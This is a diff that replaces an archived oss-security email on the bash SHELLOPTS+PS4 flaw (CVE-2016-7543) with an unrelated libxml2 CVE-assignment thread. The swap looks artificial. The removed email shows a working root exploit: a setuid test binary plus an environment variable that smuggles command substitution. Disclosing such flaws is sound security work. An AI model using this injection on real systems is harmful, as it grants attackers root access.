@@ -1,34 +1,48 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/26/9
-Message-ID: <20160926174325.74454qfavcdb1uyo@webmail.alunos.dcc.fc.up.pt>
-Date: Mon, 26 Sep 2016 17:43:25 +0200
-From: up201407890@...nos.dcc.fc.up.pt
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/01/26/8
+Message-ID: <20160126203428.GA30775@eldamar.local>
+Date: Tue, 26 Jan 2016 21:34:28 +0100
+From: Salvatore Bonaccorso <carnil@...ian.org>
 To: oss-security@...ts.openwall.com
-Subject: CVE-2016-7543 -- bash SHELLOPTS+PS4
+Cc: limingxing@....cn, cve-assign@...re.org
+Subject: Re: Re: Out-of-bounds Read in the libxml2's htmlParseNameComplex() function
 Content-Type: text/plain; charset=utf-8
 
-The recent bash 4.4 patched an old attack vector regarding
-specially crafted SHELLOPTS+PS4 environment variables
-against bogus setuid binaries using system()/popen().
+Hi,
 
-https://lists.gnu.org/archive/html/bug-bash/2016-09/msg00018.html
+On Tue, Jan 26, 2016 at 12:49:12PM -0500, cve-assign@...re.org wrote:
+> -----BEGIN PGP SIGNED MESSAGE-----
+> Hash: SHA256
+> 
+> > HTMLparser.c line:2517 :
+> > 
+> >        return(xmlDictLookup(ctxt->dict, ctxt->input->cur - len, len));
+> > 
+> > "ctxt->input->cur - len"  cause Out-of-bounds Read.
+> > 
+> > heap-buffer-overflow
+> > READ of size 1
+> 
+> Use CVE-2016-2073.
+> 
+> 
+> > From: Salvatore Bonaccorso
+> > 
+> > While checking upstream bugzilla to see if that was reported I noticed
+> > 
+> > https://bugzilla.gnome.org/show_bug.cgi?id=749115
+> > 
+> > Does this have the same root cause?
+> 
+> The CVE-2016-2073 PoC is an '&' followed by three characters, one of
+> which is a 0273 character. The PoC in 749115 has an unexpected
+> character immediately after a "<!DOCTYPE html" substring. We feel that
+> the CVE-2016-2073 report can have that unique ID on the basis of (at
+> least) a different attack methodology. CVE assignment for 749115 is
+> also possible unless 749115 already has a CVE ID.
 
-"nn. Shells running as root no longer inherit PS4 from the environment,
-closing a security hole involving PS4 expansion performing command
-substitution."
+Thank you for the clarification. Can you assign an additional CVE for
+the 749115 issue?
 
-# gcc -xc - -otest <<< 'int main() { setuid(0); system("/bin/date"); }'
-# chmod 4755 ./test
-# ls -l ./test
--rwsr-xr-x. 1 root root 8549 Sep 10 18:06 ./test
-# exit
-$ env -i SHELLOPTS=xtrace PS4='$(id)' ./test
-uid=0(root)
-Sat Sep 10 18:06:36 WET 2016
-
-Sorry Tavis :P
-
-----------------------------------------------------------------
-This message was sent using IMP, the Internet Messaging Program.
-
-
+Regards,
+Salvatore
